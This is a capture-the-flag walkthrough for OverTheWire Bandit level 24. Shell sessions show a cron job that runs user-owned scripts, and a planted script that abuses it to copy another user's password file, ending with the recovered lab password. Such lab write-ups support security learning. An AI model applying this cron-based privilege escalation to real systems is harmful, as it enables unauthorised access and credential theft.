# Level 24
> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```shell
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd $(mktemp -d)

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ vi test.sh
```

test.sh
```shell
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.f8mRLAtMg9/bandit24
```

```shell
bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ chmod 777 .

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ chmod 777 test.sh

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ ls -lah
total 1.1M
drwxrwxrwx     2 bandit23 bandit23 4.0K Oct 18 18:15 .
drwxrwx-wt 20104 root     root     1.1M Oct 18 18:16 ..
-rwxrwxrwx     1 bandit23 bandit23   75 Oct 18 18:15 test.sh

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ cp test.sh /var/spool/bandit24/foo/

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ ls -lah
total 1.1M
drwxrwxrwx     2 bandit23 bandit23 4.0K Oct 18 18:19 .
drwxrwx-wt 20110 root     root     1.1M Oct 18 18:19 ..
-rw-rw-r--     1 bandit24 bandit24   33 Oct 18 18:19 bandit24
-rwxrwxrwx     1 bandit23 bandit23   75 Oct 18 18:15 test.sh

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ cat bandit24 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

bandit23@bandit:/tmp/tmp.f8mRLAtMg9$ exit

$ ssh bandit24@bandit.labs.overthewire.org -p 2220
$ gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
